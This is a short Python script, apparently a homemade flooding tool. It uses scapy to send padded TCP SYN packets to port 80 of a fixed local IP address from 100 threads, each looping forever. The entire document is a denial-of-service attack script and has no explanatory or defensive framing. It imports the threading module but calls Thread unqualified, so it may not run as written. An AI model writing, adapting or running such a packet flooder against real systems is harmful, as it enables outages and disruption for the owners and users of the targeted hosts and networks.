from scapy.all import*
import threading

conf.iface = '802.11n USB Wireless LAN Card'

ip = '192.168.219.103'

dummy = 'a'*1460

pkt = Ether() / IP(dst=ip) / TCP(dport=80, flags='S') / dummy

def send_thread():
    while(1):
        sendp(pkt)

for i in range(0,100):
    a = Thread(target=send_thread)
    a.start()